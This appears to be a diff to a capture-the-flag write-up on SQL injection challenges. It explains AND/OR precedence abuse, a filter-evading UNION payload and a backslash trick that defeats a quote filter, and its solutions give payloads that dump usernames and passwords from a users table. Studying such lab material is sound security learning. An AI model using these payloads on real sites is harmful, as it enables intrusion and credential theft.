@@ -29,10 +29,12 @@ Explanation:-------------------------------------------------------------------
     $query = "SELECT username FROM users where username = '" . $_POST['username
       '] . "' and password = ?";
   
-  For this example, it is important to know that and has higher precedence
-  than or, so we can use this fact to manipulate results and return the
-  administrator. When we do this, query will actually return the admininstrtor
-  row/info and we will login as the admin.
+  For this example, it is important to know that 'AND' has higher precedence
+  than 'OR', so we can use this fact to manipulate results and return the
+  administrator. Essentially, the 'AND' works to limit the results, but since
+  it runs before 'OR', we can craft a set of logical operations that result
+  in the password checking being useless and we can return the admininstrtor
+  row/info.
 
     $query = $conn->prepare($query); <----- CRAFT MALICIOUS SQL TO PASS THIS
                                               TRIAL AND ERROR
@@ -97,7 +99,7 @@ Explanation:-------------------------------------------------------------------
 
 Solution:----------------------------------------------------------------------
   greatest%' UNunionION (SEselectLECT users.username, users.password,3 FROM 
-    users);-- %';
+    users);#
 
 ###############################################################################
 Level 4
@@ -153,6 +155,30 @@ Explanation:-------------------------------------------------------------------
       if (strpos($_GET['q'], "'") !== false) die("Hacker detected"); 
       if (strpos($_GET['q'], '"') !== false) die("Hacker detected"); 
     }
+  
+  Now we cant escape with a quote. However, we can turn the normal ' into an
+  string by composing an injected SQL query that contains the \ symbol. To
+  illustrate the concept, consider the SQL query:
+
+    SELECT * FROM table Where username = ' TOKEN ' OR extra junk
+
+  If our token is \, then:
+
+    SELECT * FROM table Where username = ' \' OR extra junk
+
+  Now, the quote is unclosed and everything beyond the token is now a string.
+  We need to grab values from the users table by injecting something into
+  the query:
+
+    SELECT * FROM search_engine WHERE title LIKE '%" . $_GET['q'].  "%' OR 
+      description LIKE '%" . $_GET['q'] .  "%' OR link LIKE '%" . $_GET['q'] . 
+      "%';
+  
+  I just played around with this in an editor that showed me how the statement
+  would behave. Initially, I just put in a \ to see what the result was. Then
+  I tried UNION \ and the syntax highlighting feature of the editor showed
+  that with this injection, some parts were exectuable query statements. So,
+  I just re-used the same injection to get the flag.
 
 Solution:----------------------------------------------------------------------
-    %'/**/UNION(SELECT(users.username),(users.password),(3)FROM(users));#
+  UNION SELECT users.username,users.password,3 FROM users;# \
